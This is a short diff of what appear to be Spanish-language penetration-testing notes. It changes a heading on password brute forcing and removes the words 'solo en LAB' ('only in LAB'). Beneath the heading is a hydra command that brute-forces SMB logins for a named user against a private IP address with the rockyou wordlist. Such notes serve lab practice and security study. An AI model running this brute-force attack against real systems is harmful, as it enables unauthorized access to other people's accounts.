@@ -53,7 +53,7 @@ Users                                                   READ ONLY
 
 ---
 
-## 3) Fuerza bruta de contraseñas (solo en LAB)
+## 3) Fuerza bruta de contraseñas 
 
 ```bash
 hydra -l mario -P /usr/share/wordlists/rockyou.txt smb://10.0.8.11
